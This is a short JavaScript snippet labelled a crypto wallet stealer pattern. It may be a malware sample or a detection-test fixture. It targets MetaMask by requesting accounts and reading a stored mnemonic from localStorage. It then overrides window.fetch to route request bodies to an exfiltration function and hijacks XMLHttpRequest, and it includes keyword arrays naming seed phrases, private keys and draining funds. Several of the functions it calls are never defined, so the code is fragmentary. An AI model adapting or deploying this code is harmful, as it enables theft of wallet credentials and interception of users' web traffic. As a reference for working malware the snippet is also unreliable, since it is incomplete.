// Crypto wallet stealer pattern
const _0x4a2b = ['ethereum', 'send'];
const _0x5c3d = ['request', 'accounts'];
const _0x6e4f = ['drain', 'wallet'];
const _0x7f50 = ['private', 'key'];
const _0x8061 = ['mnemonic', 'phrase'];
const _0x9172 = ['seed', 'backup'];
const _0x0283 = ['transfer', 'eth'];
const _0xab94 = ['sign', 'tx'];
const _0xbca5 = ['approve', 'all'];
const _0xcdb6 = ['steal', 'funds'];

// Target MetaMask
if (window.ethereum) {
  window.ethereum.request({ method: 'eth_requestAccounts' });
  const privateKey = localStorage.getItem('mnemonic');
  checkethereumw();
  runmask();
  newdlocal();
}

// Intercept fetch
window.fetch = function(url, opts) {
  exfilData(opts.body);
  return originalFetch(url, opts);
};

// Hijack XHR
XMLHttpRequest.prototype.open = function() {
  interceptRequest(arguments);
};
